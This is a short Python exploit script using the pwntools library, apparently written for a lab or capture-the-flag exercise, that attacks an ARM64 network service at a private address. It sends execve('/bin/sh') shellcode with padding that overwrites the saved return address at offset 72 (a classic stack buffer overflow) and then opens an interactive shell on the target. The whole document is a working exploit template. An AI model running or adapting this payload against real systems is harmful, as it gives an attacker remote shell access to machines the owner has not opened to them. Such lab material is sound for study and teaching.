from pwn import *

context.arch = 'aarch64'
context.terminal = ['tmux', 'splitw', '-h']

# Replace with IP of vulnerable VM
HOST = "10.0.2.15"
PORT = 1337

# Connect to remote vulnerable service
p = remote(HOST, PORT)

# ARM64 shellcode for execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# Buffer layout:
# - 64 bytes buffer
# - 8 bytes saved FP
# - overwrite LR at offset 72
padding = b"A" * (72 - len(shellcode))

# Replace with actual buffer address (use info leak or GDB in lab)
ret_addr = p64(0xffffffffeeb0)

# Final payload
payload = shellcode + padding + ret_addr

p.sendline(payload)
p.interactive()
